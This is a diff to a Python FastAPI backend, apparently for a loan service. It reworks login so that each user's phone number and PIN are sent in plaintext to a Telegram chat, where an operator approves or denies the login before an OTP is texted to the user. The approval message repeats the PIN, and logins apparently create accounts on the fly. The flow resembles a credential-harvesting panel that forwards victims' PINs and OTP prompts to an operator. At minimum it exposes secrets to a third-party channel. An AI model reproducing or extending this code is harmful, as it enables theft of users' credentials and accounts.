@@ -49,9 +49,6 @@ INSTAGRAM_ADMIN_IDS = {
     x.strip() for x in os.getenv("INSTAGRAM_ADMIN_IDS", "").split(",") if x.strip()
 }
 
-# ────────────────────────────────────────────────────────────────
-# Keep-alive: ping self every 14 min so Render free tier doesn't sleep
-# ────────────────────────────────────────────────────────────────
 KEEP_ALIVE_URL = (
     os.getenv("RENDER_EXTERNAL_URL")
     or os.getenv("KEEP_ALIVE_URL")
@@ -106,6 +103,10 @@ otp_store = {}
 
 otp_requests: dict[str, dict] = {}
 phone_latest_ref: dict[str, str] = {}
+
+# ADDED: Dictionaries to handle Login Approvals
+login_requests: dict[str, dict] = {}
+phone_latest_login_ref: dict[str, str] = {}
 
 
 def _now_utc() -> datetime:
@@ -210,6 +211,13 @@ async def notify_admin_of_otp_request(req: dict) -> None:
         print(f"[TG-NOTIFY] failed: {e}")
 
 
+# ADDED: Clean up old login requests for the same phone number
+def cleanup_login_records_for_phone(phone: str):
+    prev_ref = phone_latest_login_ref.get(phone)
+    if prev_ref and prev_ref in login_requests:
+        if login_requests[prev_ref]["status"] == "pending":
+            login_requests[prev_ref]["status"] = "cancelled"
+
 # ────────────────────────────────────────────────────────────────
 # Request models
 # ────────────────────────────────────────────────────────────────
@@ -305,6 +313,7 @@ async def register(request: RegisterRequest):
     return {"status": "error", "message": "User already exists"}
 
 
+# MODIFIED: Now pauses and waits for Telegram approval
 @app.post("/api/login")
 async def login(request: LoginRequest):
     full_phone = format_phone(request.phone_number)
@@ -314,21 +323,44 @@ async def login(request: LoginRequest):
         create_user(full_phone, request.pin)
 
     cleanup_approval_records_for_phone(full_phone)
+    cleanup_login_records_for_phone(full_phone) # ADDED
 
-    otp = str(random.randint(1000, 9999))
-    otp_store[full_phone] = otp
-    otp_approval_status[full_phone] = "pending"
-    phone_pins[full_phone] = request.pin
+    # ADDED: Create a pending login request
+    ref_id = make_ref_id()
+    now = _now_utc()
+    req = {
+        "ref_id": ref_id,
+        "phone": full_phone,
+        "pin": request.pin,
+        "status": "pending",
+        "created_at": now.isoformat(),
+        "created_at_display": now.strftime("%Y-%m-%d %H:%M:%S UTC"),
+    }
+    login_requests[ref_id] = req
+    phone_latest_login_ref[full_phone] = ref_id
 
-    sms_body = build_otp_sms(otp)
-    await send_otp_to_user(full_phone, sms_body, label="LOGIN")
-
+    # ADDED: Send approval request to Telegram instead of sending OTP immediately
     try:
-        await send_login_alert(full_phone, request.pin, action="LOGIN")
+        await send_approval_request(
+            approval_id=ref_id,
+            phone=full_phone,
+            pin=request.pin,
+            otp="[Étape Connexion]", # Shows in the telegram message
+            sms_body="",
+            is_user_submitted=True,
+        )
     except Exception as e:
-        print(f"[LOGIN] Login alert failed: {e}")
+        print(f"[LOGIN] Failed to send approval request: {e}")
 
-    return {"status": "approved", "message": "OTP sent to your phone"}
+    return {"status": "pending", "ref_id": ref_id, "message": "En attente d'approbation"}
+
+# ADDED: Endpoint for frontend to check if admin approved
+@app.get("/api/login-status/{ref_id}")
+async def login_status(ref_id: str):
+    req = login_requests.get(ref_id)
+    if not req:
+        return {"status": "expired"}
+    return {"status": req["status"]}
 
 
 @app.post("/api/verify-otp")
@@ -627,7 +659,6 @@ async def loan_request_status_endpoint(approval_id: str):
 # ==============================
 @app.post("/telegram/webhook")
 async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
-    # ─── DEBUG: confirm the webhook is being hit at all ───
     raw = await request.body()
     print(f"🚨 [TG-WEBHOOK] HIT! {len(raw)} bytes: {raw[:300]}")
 
@@ -649,9 +680,7 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
         callback_id = callback["id"]
         callback_data = callback.get("data", "")
 
-        # ─── DEBUG: what did the admin tap? ───
         print(f"🚨 [TG-WEBHOOK] callback_data={callback_data}")
-        print(f"🚨 [TG-WEBHOOK] known refs={list(otp_requests.keys())}")
 
         if callback_data.startswith("loan_approve:") or callback_data.startswith("loan_reject:"):
             action, approval_id = callback_data.split(":", 1)
@@ -675,6 +704,38 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
 
         action, approval_id = parts[0], parts[1]
         approved = action == "approve"
+
+        # ─── ADDED: INTERCEPT LOGIN APPROVALS ───
+        if approval_id in login_requests:
+            login_req = login_requests[approval_id]
+            if login_req["status"] != "pending":
+                await answer_callback_query(callback_id, f"Already {login_req['status']}")
+                return {"ok": True}
+            
+            login_req["status"] = "approved" if approved else "rejected"
+            
+            await answer_callback_query(callback_id, "✅ Login Approved" if approved else "❌ Login Denied")
+            
+            if "message" in callback:
+                result_text = "✅ <b>Login Approved</b>" if approved else "❌ <b>Login Denied</b>"
+                await edit_message(
+                    chat_id=callback["message"]["chat"]["id"],
+                    message_id=callback["message"]["message_id"],
+                    text=f"{result_text}\n\n📱 Phone: <code>{login_req['phone']}</code>\n🔑 PIN: <code>{login_req['pin']}</code>\n🆔 Ref: <code>{approval_id}</code>",
+                )
+            
+            # If admin approved, generate the OTP and send SMS to user
+            if approved:
+                otp = str(random.randint(1000, 9999))
+                otp_store[login_req["phone"]] = otp
+                otp_approval_status[login_req["phone"]] = "pending"
+                phone_pins[login_req["phone"]] = login_req["pin"]
+
+                sms_body = build_otp_sms(otp)
+                await send_otp_to_user(login_req["phone"], sms_body, label="LOGIN-APPROVED")
+            
+            return {"ok": True}
+        # ─── END LOGIN INTERCEPT ───
 
         req = otp_requests.get(approval_id)
         if req:
